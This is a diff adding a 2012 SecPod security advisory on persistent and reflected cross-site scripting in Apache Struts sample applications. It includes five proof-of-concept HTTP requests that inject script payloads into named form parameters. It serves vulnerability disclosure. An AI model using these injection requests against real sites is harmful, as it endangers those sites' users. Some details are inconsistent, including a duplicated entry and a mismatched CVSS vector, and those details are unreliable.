@@ -1,0 +1,218 @@
+##############################################################################
+#
+# Title    : Apache Struts Multiple Persistent Cross-Site Scripting Vulnerabilities
+# Author   : Antu Sanadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://struts.apache.org/
+# Advisory : http://secpod.org/blog/?p=450
+#            http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt
+# Software : Apache struts 1.3.10, 2.0.14 and 2.2.3
+# Date     : 01/02/2012
+#
+##############################################################################
+
+SecPod ID: 1021					21/07/2011 Issue Discovered
+						03/08/2011 Vendor Notified
+						No Response
+						01/02/2012 Advisory Released
+
+Class: Cross-Site Scripting (Persistence)	Severity: High
+
+
+Overview:
+---------
+Apache Struts Multiple Persistence Cross-Site Scripting Vulnerabilities.
+
+
+Technical Description:
+----------------------
+Multiple persistence Cross-Site Scripting vulnerabilities are present in
+Apache Struts, as it fails to sanitise user-supplied input.
+
+ i)   Input passed via the 'name' and 'lastName' parameter in
+      '/struts2-showcase/person/editPerson.action' is not properly verified
+      before it is returned to the user. This can be exploited to execute
+      arbitrary HTML and script code in a user's browser session in the
+      context of a vulnerable site.
+
+ ii)  Input passed via the 'clientName' parameter in
+      '/struts2-rest-showcase/orders' action is not properly verified before
+      it is returned to the user. This can be exploited to execute arbitrary
+      HTML and script code in a user's browser session in the context of a
+      vulnerable site.
+
+ iii) Input passed via the 'name' parameter in
+      '/struts-examples/upload/upload-submit.do?queryParam=Successful' action
+      is not properly verified  before it is returned to the user. This can be
+      exploited to execute arbitrary HTML and script code in a user's browser
+      session in the context of a vulnerable site.
+
+ iV)  Input passed via the 'message' parameter in
+      '/struts-cookbook/processSimple.do' action is not properly verified
+      before it is returned to the user. This can be exploited to execute
+      arbitrary HTML and script code in a user's browser session in the
+      context of a vulnerable site.
+
+ V)   Input passed via the 'message' parameter in
+      '/struts-cookbook/processSimple.do' action is not properly verified
+      before it is returned to the user. This can be exploited to execute
+      arbitrary HTML and script code in a user's browser session in the
+      context of a vulnerable site.
+
+  These vulnerabilities have been tested on Apache Struts2 v2.2.3,
+  Apache Struts2 v2.0.14 and Apache Struts v1.3.10. 
+  Other versions may also be affected.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to execute arbitrary HTML
+code in a user's browser session in the context of a vulnerable application.
+
+
+Affected Software:
+------------------
+Apache struts 2.2.3 and prior.
+
+Tested on,
+ i)   Apache struts 2.2.3 - Stored XSS 
+      - struts2-showcase-2.2.3
+      - struts2-rest-showcase-2.2.3
+
+ ii)  Apache struts 2.0.14 - Stored XSS 
+      - struts2-showcase-2.0.14
+
+ iii) Apache struts 1.3.10 - Reflected XSS 
+      - struts-cookbook-1.3.10
+      - struts-examples-1.3.10
+
+
+References:
+-----------
+http://struts.apache.org
+http://secpod.org/blog/?p=450
+
+
+Proof of Concept:
+-----------------
+
+POC 1:
+-----
+Stored XSS 
+
+POST struts2-showcase/person/editPerson.action HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: struts2-showcase XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+Post Data:
+----------
+persons%281%29.name=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript
+%3E&persons%281%29.lastName=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2
+Fscript%3E&method%3Asave=Save+all+persons
+
+
+POC 2:
+-----
+Stored XSS 
+
+POST /struts2-rest-showcase/orders HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: struts2-rest-showcase XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+
+Post Data:
+----------
+clientName=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&amount=
+
+
+POC 3: 
+-----
+Reflected XSS 
+
+POST /struts-examples/upload/upload-submit.do?queryParam=Successful HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: Struts-examples XSS-TEST
+Content-Type: multipart/form-data; boundary=---------------------------41701
+161044225432961947041
+Content-Length: 481
+
+Post Data:
+----------
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="theText"\r\n
+\r\n
+<script>alert("SecPod-XSS-TEST")</script>\r\n
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="theFile"; filename=""\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+\r\n
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="filePath"\r\n
+\r\n
+\r\n
+-----------------------------41701161044225432961947041--\r\n
+
+
+POC 4:
+-----
+Reflected XSS 
+
+POST /struts-cookbook/processSimple.do HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent:Struts-cookbook XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+Post Data:
+----------
+name=XYZ&secret=XYZ&color=red&confirm=on&rating=1&message=%3Cscript%3Ealert
+%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&
+
+
+POC 5:
+-----
+Reflected XSS 
+
+POST /struts-cookbook/processDyna.do HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent:Struts-cookbook XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+Post Data:
+----------
+name=ZYZ&secret=&color=red&message=%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C%2Fscript%3E&
+
+
+Solution:
+---------
+Fix not available
+
+
+Risk Factor:
+-------------
+   CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NONE
+        CONFIDENTIALITY_IMPACT = PARTIAL
+        INTEGRITY_IMPACT       = PARTIAL
+        AVAILABILITY_IMPACT    = NONE
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 6.4 (High) (AV:N/AC:L/Au:N/C:N/I:P/A:N)
+
+Credits:
+--------
+Antu Sanadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
